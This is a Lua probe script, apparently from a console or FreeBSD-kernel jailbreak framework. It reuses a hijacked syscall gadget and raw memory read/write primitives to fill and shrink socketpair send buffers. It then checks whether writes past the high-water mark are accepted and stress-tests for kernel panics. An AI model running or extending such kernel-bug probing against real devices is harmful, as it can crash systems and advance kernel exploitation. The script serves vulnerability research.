-- CRASH_CLASS: LOW
-- PROBE 93a9: SO_SNDBUF fill+shrink — use recv(MSG_DONTWAIT) for drain

print("=== PROBE 93a9 ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local pid_val = N(native.fcall_with_rax(syscall.pipe.fn_addr, 20))
print("pid=" .. pid_val)

local buf = memory.alloc(256)
local sv = memory.alloc(4)
local ov = memory.alloc(4)
local ol = memory.alloc(4)
local dbuf = memory.alloc(0x1000)

-- recv(fd, buf, len, MSG_DONTWAIT) = recvfrom(29)
-- recvfrom(int s, void *buf, size_t len, int flags, ...) = syscall 29

for trial = 1, 5 do
    local sp = memory.alloc(8)
    wd(N(sp), 0); wd(N(sp)+4, 0)
    local r = sgn(mk(135)(uint64(1), uint64(1), uint64(0), sp))
    local fW = rd(N(sp)) or -1
    local fR = rd(N(sp)+4) or -1
    if r ~= 0 then print("t" .. trial .. ": sp fail"); break end

    -- SO_SNDBUF = 65536
    wd(N(sv), 65536)
    mk(105)(uint64(fW), uint64(0xFFFF), uint64(0x1001), sv, uint64(4))

    -- Fill with sendto(MSG_DONTWAIT)
    local filled = 0
    for i = 1, 300 do
        local ok2, ret = pcall(function()
            return mk(133)(uint64(fW), uint64(N(buf)), uint64(256), uint64(0x80))
        end)
        if not ok2 then break end
        local v = sgn(ret)
        if v <= 0 then break end
        filled = filled + v
    end

    -- Shrink SO_SNDBUF to 1
    wd(N(sv), 1)
    pcall(function() mk(105)(uint64(fW), uint64(0xFFFF), uint64(0x1001), sv, uint64(4)) end)
    wd(N(ov), 0); wd(N(ol), 4)
    pcall(function() mk(118)(uint64(fW), uint64(0xFFFF), uint64(0x1001), ov, ol) end)
    local sb = rd(N(ov)) or -1

    -- Try extra write with MSG_DONTWAIT (overfull buffer, sb_hiwat=1)
    local ok3, ret3 = pcall(function()
        return mk(133)(uint64(fW), uint64(N(buf)), uint64(64), uint64(0x80))
    end)
    local extra = ok3 and sgn(ret3) or -999

    -- Drain with recvfrom(MSG_DONTWAIT) — syscall 29
    local drained = 0
    for d = 1, 100 do
        local ok4, dr = pcall(function()
            return mk(29)(uint64(fR), uint64(N(dbuf)), uint64(0x1000), uint64(0x80))
        end)
        if not ok4 then break end
        local dv = sgn(dr)
        if dv <= 0 then break end
        drained = drained + dv
    end

    -- Post-drain write: sndbuf is STILL 1. Does kernel allow a write now?
    local ok5, ret5 = pcall(function()
        return mk(133)(uint64(fW), uint64(N(buf)), uint64(64), uint64(0x80))
    end)
    local post = ok5 and sgn(ret5) or -999

    -- Post-drain write of just 1 byte
    local ok6, ret6 = pcall(function()
        return mk(133)(uint64(fW), uint64(N(buf)), uint64(1), uint64(0x80))
    end)
    local post1 = ok6 and sgn(ret6) or -999

    print(string.format("t%d: fill=%d sb=%d extra=%d drain=%d post64=%d post1=%d",
        trial, filled, sb, extra, drained, post, post1))

    if extra > 0 then print("  *** WRITE PAST HIWAT (buffer full) ***") end
    if post > 0 then print("  *** POST-DRAIN WRITE>HIWAT ACCEPTED ***") end
    if post1 > 0 then print("  *** POST-DRAIN 1B ACCEPTED (sb_hiwat=1) ***") end

    pcall(function() mk(6)(uint64(fW)) end)
    pcall(function() mk(6)(uint64(fR)) end)
end

-- Stress: 50 fill+shrink+close (no drain)
print("")
print("STRESS: 50 fill+shrink+close")
local ok_count = 0
for trial = 1, 50 do
    local sp = memory.alloc(8)
    wd(N(sp), 0); wd(N(sp)+4, 0)
    local r = sgn(mk(135)(uint64(1), uint64(1), uint64(0), sp))
    if r ~= 0 then break end
    local w = rd(N(sp)) or -1
    local rv = rd(N(sp)+4) or -1
    wd(N(sv), 65536)
    pcall(function() mk(105)(uint64(w), uint64(0xFFFF), uint64(0x1001), sv, uint64(4)) end)
    for i = 1, 300 do
        local ok2, ret = pcall(function()
            return mk(133)(uint64(w), uint64(N(buf)), uint64(256), uint64(0x80))
        end)
        if not ok2 or sgn(ret) <= 0 then break end
    end
    wd(N(sv), 1)
    pcall(function() mk(105)(uint64(w), uint64(0xFFFF), uint64(0x1001), sv, uint64(4)) end)
    pcall(function() mk(6)(uint64(w)) end)
    pcall(function() mk(6)(uint64(rv)) end)
    ok_count = ok_count + 1
end
local alive = N(native.fcall_with_rax(syscall.pipe.fn_addr, 20)) == pid_val
print("  " .. ok_count .. "/50  alive=" .. (alive and "Y" or "N"))
if not alive then print("*** KERNEL PANIC ***") end

print("=== 93a9 COMPLETE ===")
